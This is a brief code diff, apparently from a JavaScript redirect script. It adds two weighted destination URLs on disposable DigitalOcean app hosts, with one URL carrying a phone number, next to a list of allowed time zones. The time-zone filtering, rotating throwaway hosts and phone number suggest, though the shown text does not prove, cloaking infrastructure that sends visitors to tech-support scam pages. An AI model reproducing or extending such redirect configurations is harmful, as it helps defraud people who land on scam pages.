@@ -34,7 +34,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://starfish-app-88hjs.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 1.0 }
+    { url: "https://coral-app-3jdtx.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 0.5 },
+    { url: "https://hammerhead-app-adz6i.ondigitalocean.app/werrx01USAHTML/?bcda=1800-549-821", weight: 0.5 }
     
 ];
 
